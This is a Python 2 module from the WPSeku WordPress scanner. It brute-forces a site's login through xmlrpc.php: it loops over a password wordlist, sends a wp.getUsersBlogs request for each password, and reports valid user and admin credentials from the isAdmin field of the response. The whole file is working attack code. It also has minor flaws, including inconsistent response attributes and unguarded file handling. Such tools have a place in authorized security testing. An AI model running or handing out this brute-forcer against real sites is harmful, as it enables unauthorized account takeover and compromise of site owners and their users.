#/usr/bin/env python
# -*- Coding: UTF-8 -*-
#
# WPSeku: Wordpress Security Scanner
#
# @url: https://github.com/m4ll0k/WPSeku
# @author: Momo Outaadi (M4ll0k)

import re

from lib import wphttp
from lib import wpprint

class wpxmlrpc:
	
	chk = wphttp.UCheck() 
	out = wpprint.wpprint()
	
	def __init__(self,agent,proxy,redir,time,url,cookie,wlist,user):
		self.url = url
		self.cookie = cookie
		self.wlist = wlist
		self.user = user
		self.req = wphttp.wphttp(
			agent=agent,proxy=proxy,
			redir=redir,time=time
			)
	def run(self):
		try:
			wpxmlrpc.out.plus('Bruteforcing login via xmlrpc..')
			try:
				db = open(self.wlist,'rb')
			except Exception,e:
				wpxmlrpc.out.warning(e)
			dbfiles = [file.split('\n') for file in db]
			for passwd in dbfiles:
				payload = """<methodCall><methodName>wp.getUsersBlogs</methodName><params>
				<param><value><string>"""+self.user+"""</string></value></param>
				<param><value><string>"""+str(passwd[0])+"""</string></value></param></params>
				</methodCall>"""
				url = wpxmlrpc.chk.path(self.url,'/xmlrpc.php')
				resp = self.req.send(url,m="POST",p=payload,c=self.cookie)
				if re.search('<name>isAdmin</name><value><boolean>0</boolean>',resp._content):
					wpxmlrpc.out.plus('Valid credentials: \"{}\" - \"{}\"'.format(self.user,passwd[0]))
				elif re.search('<name>isAdmin</name><value><boolean>1</boolean>',resp.content):
					wpxmlrpc.out.plus('Valid admin credentials: \"{}\" - \"{}\"'.format(self.user,passwd[0]))
			wpxmlrpc.out.passs()
		except Exception,e:
			pass